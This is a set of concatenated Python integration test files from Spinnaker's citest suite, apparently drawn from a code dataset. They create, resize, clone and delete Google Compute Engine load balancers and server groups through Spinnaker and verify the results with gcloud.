    """"""Creates a test unregistering instances from load balancer.

    Returns:
      st.OperationContract
    """"""
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
       'deregisterInstancesFromGoogleLoadBalancerDescription',
        {
          'loadBalancerNames': [self.__use_lb_name],
          'instanceIds': self.use_instance_names[:2],
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    # NOTE(ewiseblatt): 20150530
    # This displays an error that 'instances' field doesnt exist.
    # That's because it was removed because all the instances are gone.
    # I dont have a way to express that the field itself is optional,
    # just the record. Leaving it as is because displaying this type of
    # error is usually helpful for development.
    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instances not in Target Pool',
                                retryable_for_secs=5)
       .list_resources(
          'target-pools',
          extra_args=['--region', self.bindings['TEST_GCE_REGION']])
       .excludes_pred_list(
          [jp.PathContainsPredicate('name', self.__use_lb_tp_name),
           jp.PathElementsContainPredicate(
              'instances', self.use_instance_names[0]),
           jp.PathElementsContainPredicate(
              'instances', self.use_instance_names[1])]))

    return st.OperationContract(
      self.new_post_operation(
          title='deregister_load_balancer_instances', data=payload, path='ops'),
      contract=builder.build())

  def list_available_images(self):
    """"""Creates a test that confirms expected available images.

    Returns:
      st.OperationContract
    """"""
    logger = logging.getLogger(__name__)

    # Get the list of images available (to the service account we are using).
    gcloud_agent = self.gce_observer
    service_account = self.bindings.get('GCE_SERVICE_ACCOUNT', None)
    extra_args = ['--account', service_account] if service_account else []
    logger.debug('Looking up available images.')
    cli_result = gcloud_agent.list_resources('images', extra_args=extra_args)

    if not cli_result.ok():
      raise RuntimeError('GCloud failed with: {0}'.format(str(cli_result)))
    json_doc = json_module.JSONDecoder().decode(cli_result.output)

    # Produce the list of images that we expect to receive from spinnaker
    # (visible to the primary service account).
    spinnaker_account = self.agent.deployed_config.get(
        'providers.google.primaryCredentials.name')

    logger.debug('Configured with Spinnaker account ""%s""', spinnaker_account)
    expect_images = [{'account': spinnaker_account, 'imageName': image['name']}
                     for image in json_doc]
    expect_images = sorted(expect_images, key=lambda k: k['imageName'])

    # pylint: disable=bad-continuation
    builder = HttpContractBuilder(self.agent)
    (builder.new_clause_builder('Has Expected Images')
       .get_url_path('/gce/images/find')
       .add_constraint(jp.PathPredicate(jp.DONT_ENUMERATE_TERMINAL,
                                        jp.EQUIVALENT(expect_images))))

    return st.OperationContract(
        NoOpOperation('List Available Images'),
        contract=builder.build())


class GoogleKatoIntegrationTest(st.AgentTestCase):
  def Xtest_a_upsert_server_group_tags(self):
    self.run_test_case(self.scenario.upsert_google_server_group_tags())

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_b_create_instances(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_register_load_balancer_instances(self):
    self.run_test_case(self.scenario.register_load_balancer_instances())

  def test_d_create_http_load_balancer(self):
    self.run_test_case(self.scenario.create_http_load_balancer())

  def test_v_delete_http_load_balancer(self):
    self.run_test_case(
        self.scenario.delete_http_load_balancer(), timeout_ok=True,
        retry_interval_secs=10, max_retries=9)

  def test_w_deregister_load_balancer_instances(self):
    self.run_test_case(self.scenario.deregister_load_balancer_instances())

  def test_x_terminate_instances(self):
    # delete 1 which was in a different zone than the other two.
    # Then delete [0,2] together, which were in the same zone.
    try:
      self.run_test_case(
          self.scenario.terminate_instances(
              [self.scenario.use_instance_names[1]],
              self.scenario.use_instance_zones[1]))
    finally:
      # Always give this a try, even if the first test fails.
      # that increases our chances of cleaning everything up.
      self.run_test_case(
          self.scenario.terminate_instances(
              [self.scenario.use_instance_names[0],
               self.scenario.use_instance_names[2]],
              self.scenario.use_instance_zones[0]))

  def test_z_delete_load_balancer(self):
    # TODO(ewiseblatt): 20151220
    # The retry here is really due to the 400 ""not ready"" race condition
    # within GCP. Would be better to couple this to the agent and not the
    # test so that it is easier to maintain. Need to add a generalization
    # so the agent can see this is a delete test, got a 400, and only
    # in that condition override the default retry parameters, then stick
    # with the defaults here.
    self.run_test_case(self.scenario.delete_load_balancer(), max_retries=5)

  def test_available_images(self):
    self.run_test_case(self.scenario.list_available_images())


def main():
  return st.ScenarioTestRunner.main(
      GoogleKatoTestScenario,
      test_case_list=[GoogleKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/nspinnaker_system/google_server_group_test.py/n/n# Standard python modules.
import time
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_predicate as jp
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario):

  @classmethod
  def new_agent(cls, bindings):
    '''Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Gate.
      This is the agent that test operations will be posted to.
    '''
    return gate.new_agent(bindings)

  def __init__(self, bindings, agent=None):
    super(GoogleServerGroupTestScenario, self).__init__(bindings, agent)

    # Our application name and path to post events to.
    self.TEST_APP = bindings['TEST_APP']
    self.__path = 'applications/%s/tasks' % self.TEST_APP

    # The spinnaker stack decorator for our resources.
    self.TEST_STACK = bindings['TEST_STACK']

    self.TEST_REGION = bindings['TEST_GCE_REGION']
    self.TEST_ZONE = bindings['TEST_GCE_ZONE']

    # Resource names used among tests.
    self.__cluster_name = '%s-%s' % (self.TEST_APP, self.TEST_STACK)
    self.__server_group_name = '%s-v000' % self.__cluster_name
    self.__cloned_server_group_name = '%s-v001' % self.__cluster_name
    self.__lb_name = '%s-%s-fe' % (self.TEST_APP, self.TEST_STACK)

  def create_load_balancer(self):
    job = [{
      'cloudProvider': 'gce',
      'loadBalancerName': self.__lb_name,
      'ipProtocol': 'TCP',
      'portRange': '8080',
      'provider': 'gce',
      'stack': self.TEST_STACK,
      'detail': 'frontend',
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'region': self.TEST_REGION,
      'listeners': [{
        'protocol': 'TCP',
        'portRange': '8080',
        'healthCheck': False
      }],
      'name': self.__lb_name,
      'type': 'upsertLoadBalancer',
      'availabilityZones': {self.TEST_REGION: []},
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - create load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_load_balancer', data=payload, path=self.__path),
      contract=builder.build())

  def create_instances(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'zone': self.TEST_ZONE,
      'network': 'default',
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'availabilityZones': {
        self.TEST_REGION: [self.TEST_ZONE]
      },
      'loadBalancers': [self.__lb_name],
      'instanceMetadata': {
        'load-balancer-names': self.__lb_name
      },
      'cloudProvider': 'gce',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'instanceType': 'f1-micro',
      'initialNumReplicas': 1,
      'type': 'createServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instance Created', retryable_for_secs=150)
     .list_resources('instance-groups')
     .contains_path_value('name', self.__server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job,
        description='Server Group Test - create initial server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_instances', data=payload, path=self.__path),
      contract=builder.build())

  def resize_server_group(self):
    job = [{
      'targetSize': 2,
      'capacity': {
        'min': 2,
        'max': 2,
        'desired': 2
      },
      'replicaPoolName': self.__server_group_name,
      'numReplicas': 2,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'asgName': self.__server_group_name,
      'type': 'resizeServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'cloudProvider': 'gce',
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90)
     .inspect_resource('instance-groups',
                       self.__server_group_name,
                       ['--zone', self.TEST_ZONE])
     .contains_path_eq('size', 2))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - resize to 2 instances',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='resize_instances', data=payload, path=self.__path),
      contract=builder.build())

  def clone_server_group(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'loadBalancers': [self.__lb_name],
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'zone': self.TEST_ZONE,
      'network': 'default',
      'instanceMetadata': {'load-balancer-names': self.__lb_name},
      'availabilityZones': {self.TEST_REGION: [self.TEST_ZONE]},
      'cloudProvider': 'gce',
      'source': {
        'account': self.bindings['GCE_CREDENTIALS'],
        'region': self.TEST_REGION,
        'zone': self.TEST_ZONE,
        'serverGroupName': self.__server_group_name,
        'asgName': self.__server_group_name
      },
      'instanceType': 'f1-micro',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'initialNumReplicas': 1,
      'loadBalancers': [self.__lb_name],
      'type': 'cloneServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__cloned_server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - clone server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='clone_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def disable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'disableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__server_group_name)
     .excludes_pred_list([
         jp.PathContainsPredicate('baseInstanceName', self.__server_group_name),
         jp.PathContainsPredicate('targetPools', 'https')]))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - disable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='disable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def enable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'enableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_pred_list([
         jp.PathContainsPredicate('baseInstanceName', self.__server_group_name),
         jp.PathContainsPredicate('targetPools', 'https')]))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - enable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='enable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def destroy_server_group(self, version):
    serverGroupName = '%s-%s' % (self.__cluster_name, version)
    job = [{
      'cloudProvider': 'gce',
      'asgName': serverGroupName,
      'serverGroupName': serverGroupName,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'destroyServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .excludes_path_value('baseInstanceName', serverGroupName))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - destroy server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='destroy_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def delete_load_balancer(self):
    job = [{
      ""loadBalancerName"": self.__lb_name,
      ""networkLoadBalancerName"": self.__lb_name,
      ""region"": ""us-central1"",
      ""type"": ""deleteLoadBalancer"",
      ""regions"": [""us-central1""],
      ""credentials"": self.bindings['GCE_CREDENTIALS'],
      ""cloudProvider"": ""gce"",
      ""user"": ""integration-tests""
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .excludes_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - delete load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path=self.__path),
      contract=builder.build())


class GoogleServerGroupTest(st.AgentTestCase):
  def test_a_create_load_balancer(self):
    self.run_test_case(self.scenario.create_load_balancer())

  def test_b_create_server_group(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_resize_server_group(self):
    self.run_test_case(self.scenario.resize_server_group())

  def test_d_clone_server_group(self):
    self.run_test_case(self.scenario.clone_server_group(),
                       # TODO(ewiseblatt): 20160314
                       # There is a lock contention race condition
                       # in clouddriver that causes intermittent failure.
                       max_retries=5)

  def test_e_disable_server_group(self):
    self.run_test_case(self.scenario.disable_server_group())

  def test_f_enable_server_group(self):
    self.run_test_case(self.scenario.enable_server_group())

  def test_g_destroy_server_group_v000(self):
    self.run_test_case(self.scenario.destroy_server_group('v000'))

  def test_h_destroy_server_group_v001(self):
    self.run_test_case(self.scenario.destroy_server_group('v001'))

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():

  defaults = {
    'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID,
    'TEST_APP': 'gcpsvrgrptst' + GoogleServerGroupTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleServerGroupTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleServerGroupTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/nspinnaker_system/google_smoke_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Smoke test to see if Spinnaker can interoperate with Google Cloud Platform.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --native_hostname=host-running-smoke-test
    --managed_gce_project=$PROJECT \
    --test_gce_zone=$ZONE
""""""

# Standard python modules.
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.json_predicate as jp
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleSmokeTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """"""

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements citest.service_testing.AgentTestScenario.new_agent.""""""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """"""Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """"""
    super(GoogleSmokeTestScenario, cls).initArgumentParser(parser, defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """"""Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """"""
    super(GoogleSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """"""Creates OperationContract that creates a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """"""Creates OperationContract that deletes a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on GCE. See
    the contract builder for more info on what the expectations are.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']
    target_pool_name = '{0}/targetPools/{1}-tp'.format(
        bindings['TEST_GCE_REGION'], load_balancer_name)

    spec = {
        'checkIntervalSec': 9,
        'healthyThreshold': 3,
        'unhealthyThreshold': 5,
        'timeoutSec': 2,
        'port': 80
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'provider': 'gce',
            'stack': bindings['TEST_STACK'],
            'detail': bindings['TEST_COMPONENT_DETAIL'],
            'credentials': bindings['GCE_CREDENTIALS'],
            'region': bindings['TEST_GCE_REGION'],
            'ipProtocol': 'TCP',
            'portRange': spec['port'],
            'loadBalancerName': load_balancer_name,
            'healthCheck': {
                'port': spec['port'],
                'timeoutSec': spec['timeoutSec'],
                'checkIntervalSec': spec['checkIntervalSec'],
                'healthyThreshold': spec['healthyThreshold'],
                'unhealthyThreshold': spec['unhealthyThreshold'],
            },
            'type': 'upsertLoadBalancer',
            'availabilityZones': {bindings['TEST_GCE_REGION']: []},
            'user': '[anonymous]'
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Added',
                                retryable_for_secs=30)
     .list_resources('http-health-checks')
     .contains_pred_list(
         [jp.PathContainsPredicate('name', '%s-hc' % load_balancer_name),
          jp.DICT_SUBSET(spec)]))
    (builder.new_clause_builder('Target Pool Added',
                                retryable_for_secs=30)
     .list_resources('target-pools')
     .contains_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_pred_list([
          jp.PathContainsPredicate('name', load_balancer_name),
          jp.PathContainsPredicate('target', target_pool_name)]))

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the GCP resources
    created by upsert_load_balancer are no longer visible on GCP.
    """"""
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    bindings = self.bindings
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'gce',
            'loadBalancerName': load_balancer_name,
            'region': bindings['TEST_GCE_REGION'],
            'regions': [bindings['TEST_GCE_REGION']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            bindings['GCE_CREDENTIALS'],
            bindings['TEST_GCE_REGION']),
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed', retryable_for_secs=30)
     .list_resources('http-health-checks')
     .excludes_path_value('name', '%s-hc' % load_balancer_name))
    (builder.new_clause_builder('TargetPool Removed')
     .list_resources('target-pools')
     .excludes_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
     .list_resources('forwarding-rules')
     .excludes_path_value('name', load_balancer_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """"""Creates OperationContract for createServerGroup.

    To verify the operation, we just check that Managed Instance Group
    for the server was created.
    """"""
    bindings = self.bindings

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'application': self.TEST_APP,
            'credentials': bindings['GCE_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetSize': 2,
            'image': bindings['TEST_GCE_IMAGE_NAME'],
            'zone': bindings['TEST_GCE_ZONE'],
            'stack': bindings['TEST_STACK'],
            'instanceType': 'f1-micro',
            'type': 'createServerGroup',
            'loadBalancers': [bindings['TEST_APP_COMPONENT_NAME']],
            'availabilityZones': {
                bindings['TEST_GCE_REGION']: [bindings['TEST_GCE_ZONE']]
            },
            'instanceMetadata': {
                'startup-script': ('sudo apt-get update'
                                   ' && sudo apt-get install apache2 -y'),
                'load-balancer-names': bindings['TEST_APP_COMPONENT_NAME']
            },
            'account': bindings['GCE_CREDENTIALS'],
            'authScopes': ['compute'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Added',
                                retryable_for_secs=30)
     .inspect_resource('managed-instance-groups', group_name)
     .contains_path_eq('targetSize', 2))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """"""Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the GCP managed instance group
    is no longer visible on GCP (or is in the process of terminating).
    """"""
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    # TODO(ttomsu): Change this back from asgName to serverGroupName
    #               once it is fixed in orca.
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'serverGroupName': group_name,
            'region': bindings['TEST_GCE_REGION'],
            'zone': bindings['TEST_GCE_ZONE'],
            'asgName': group_name,
            'type': 'destroyServerGroup',
            'regions': [bindings['TEST_GCE_REGION']],
            'zones': [bindings['TEST_GCE_ZONE']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Removed')
     .inspect_resource('managed-instance-groups', group_name,
                       no_resource_ok=True)
     .contains_path_eq('targetSize', 0))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .list_resources('instances')
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class GoogleSmokeTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the GoogleSmokeTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer(),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_STACK': str(GoogleSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'gcpsmoketest' + GoogleSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleSmokeTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n",0
207,1380da4269899ce1e395f4f6574fb16f8c0a5649,"/spinnaker_system/aws_kato_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Tests to see if CloudDriver/Kato can interoperate with Amazon Web Services.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)
    and $AWS_PROFILE is the name of the aws_cli profile for authenticating
    to observe aws resources:

    This first command would be used if Spinnaker itself was deployed on GCE.
    The test needs to talk to GCE to get to spinnaker (using the gce_* params)
    then talk to AWS (using the aws_profile with the aws cli program) to
    verify Spinnaker had the right effects on AWS.

    PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
       --gce_project=$PROJECT \
       --gce_zone=$GCE_ZONE \
       --gce_instance=$INSTANCE \
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   or

     This second command would be used if Spinnaker itself was deployed some
     place reachable through a direct IP connection. It could be, but is not
     necessarily deployed on GCE. It is similar to above except it does not
     need to go through GCE and its firewalls to locate the actual IP endpoints
     rather those are already known and accessible.

     PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --native_hostname=host-running-kato
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   Note that the $AWS_ZONE is not directly used, rather it is a standard
   parameter being used to infer the region. The test is going to pick
   some different availability zones within the region in order to test kato.
   These are currently hardcoded in.
""""""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class AwsKatoTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the test.

  This scenario defines the different test operations.
  We're going to:
    Create a Load Balancer
    Delete a Load Balancer
  """"""

  __use_lb_name = ''     # The load balancer name.

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """"""
    return kato.new_agent(bindings)

  def upsert_load_balancer(self):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.
    """"""
    detail_raw_name = 'katotestlb' + self.test_id
    self.__use_lb_name = detail_raw_name

    bindings = self.bindings
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    listener = {
        'Listener': {
            'InstancePort':7001,
